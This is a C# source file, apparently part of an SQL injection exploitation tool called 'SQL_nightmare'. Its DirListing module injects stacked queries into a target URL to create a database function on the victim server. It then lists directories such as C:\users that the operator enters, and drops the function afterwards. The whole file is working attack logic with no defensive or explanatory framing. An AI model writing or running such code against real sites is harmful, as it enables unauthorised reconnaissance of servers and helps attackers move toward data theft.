using System;
using System.Collections.Generic;
using System.Text;

namespace SQL_nightmare
{
    class DirListing
    {
        public static void initialize(string url)
        {
            Log.logNotification("Confirming Web Response..");

            var urlForResponseConfirmation = QueryCrafter.constructURLForConfirmation(url, QueriesDB.Replacement);

            if (ResponseFilter.confirmResponce(urlForResponseConfirmation, QueriesDB.Replacement))
            {
                Log.logNotification("Web Response is OK..");

                if (createFuncDir(url))
                {
                    string UserChoice = "z";
                    while (UserChoice != "x")
                    {
                        UserChoice = UserInteraction.takeInputString("Press 'x' for Exit..\nEnter Directory to get listing.. eg C:\\, C:\\users\\.. ");

                        if (UserChoice != "x")
                            navigate(url, UserChoice);

                    }

                    dropObject(url, QueriesDB.DropFuncQuery);
                }
            }
            else
                Log.logError("No response from the server..");
        }

        static bool createFuncDir(string url)
        {
            try
            {
                var DIRFuncCreationURL = QueryCrafter.constructStackedQuery(url, QueriesDB.DirListingFuncQuery);
                DIRFuncCreationURL = QueryCrafter.constructURLForConfirmation(DIRFuncCreationURL, QueriesDB.Replacement);
                if (ResponseFilter.confirmResponce(DIRFuncCreationURL, QueriesDB.Replacement))
                {
                    var DIRFuncConfirmationURL = QueryCrafter.constructQueryForSelectObject(url, QueriesDB.ConfirmDirFuncQuery);
                    var response = HTTPMethods.getResponse(DIRFuncConfirmationURL);

                    if (response != null)
                    {
                        if (ResponseFilter.getPureResponseWithLastIndex(response) == "Dir")
                        {
                            Log.logOutput("Function to get Directory Listing is created..");
                            return true;
                        }
                        else
                        {
                            Log.logError("Function to get Directory Listing cannot be created..");
                            return false;
                        }
                    }
                    else
                    {
                        Log.logError("Function to get Directory Listing cannot be created..");
                        return false;
                    }
                }
                else
                {
                    Log.logError("Erroneous response from the server..");
                    Log.logError("Function to get Directory Listing cannot be created..");
                    return false;
                }
            }
            catch (Exception ex)
            {
                Log.logError(ex.Message);
                return false;
            }
        }

        static bool dropObject(string url, string ObjectDroppingQuery)
        {
            try
            {
                var DirFuncDroppingQuery = QueryCrafter.constructURLForDroppingObject(url, ObjectDroppingQuery);
                DirFuncDroppingQuery = QueryCrafter.constructURLForConfirmation(DirFuncDroppingQuery, QueriesDB.Replacement);
                if (ResponseFilter.confirmResponce(DirFuncDroppingQuery, QueriesDB.Replacement))
                    return true;
                else
                    return false;
            }
            catch (Exception ex)
            {
                Log.logError(ex.Message);
                return false;
            }
        }

        static void navigate(string url, string dir)
        {
            var URLForNavigating = QueryCrafter.constructQueryForSelectObject(url, QueriesDB.ReadDirWithFuncQuery);
            URLForNavigating = URLForNavigating.Replace("[DIR]", dir);

            var response = HTTPMethods.getResponse(URLForNavigating);
            response = ResponseFilter.getPureResponseWithLastIndex(response);

            response = XML.addRoot(response);

            FileIO.createWriteFile(response, "tmp.txt");

            List<string> DirectoryFiles = XML.parseXML("tmp.txt", "dir");

            Log.showObjects(DirectoryFiles, "DIR Listing");

        }
    }
}